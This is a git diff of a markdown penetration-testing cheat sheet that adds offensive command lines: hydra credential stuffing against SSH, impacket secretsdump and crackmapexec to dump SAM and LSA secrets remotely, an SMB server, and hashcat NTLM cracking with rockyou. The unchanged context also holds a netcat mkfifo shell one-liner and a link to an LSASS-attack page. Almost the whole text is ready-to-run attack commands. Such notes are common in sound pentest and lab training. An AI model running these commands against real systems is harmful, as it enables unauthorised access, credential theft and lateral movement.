@@ -49,6 +49,10 @@ hydra -L user.list -P password.list rdp://<ip>
 ```bash
 hydra -L user.list -P password.list smb://<ip>
 ```
+- Credential Stuffing
+```bash
+hydra -C user_pass.list ssh://<ip>
+```
 
 ---
 ## Netcat
@@ -75,8 +79,16 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> 
 ## Python
 ---
 - Python Server
-```python
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+- secretsdump.py for SAM
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+- Python smbserver.py
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 ```
 
 ---
@@ -172,6 +184,15 @@ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordl
 crackmapexec smb <target-IP> -u "user" -p "password" --shares
 ```
 #### [Example output](/Examples/Example_Crackmapexec_smbShares.md)
+
+- Dump and crack LSA Secrets Remotely
+```bash
+crackmapexec smb <ip> --local-auth -u <user> -p <password> --lsa
+```
+- Dump and crack SAM Remotely
+```bash
+crackmapexec smb <ip> --local-auth -u <user> -p <password> --sam
+```
 ---
 ## [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
 - Usage
@@ -179,6 +200,10 @@ crackmapexec smb <target-IP> -u "user" -p "password" --shares
 evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 ## Hashcat
+- Crack Hash
+```bash
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
 - Mutate a password using a custom rule.
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
@@ -294,6 +319,6 @@ ps
 - [Tipi di Shell](/Useful_Pages/Shells.md)
 - [Cmd vs Powershell](/Useful_Pages/CMD_Vs_PS.md)
 - [Upgrade a Shell](/Useful_Pages/Uprading_shell.md)
-
+- [Attacking LSASS](/Useful_Pages/Attacking_LSASS.md)
 
 
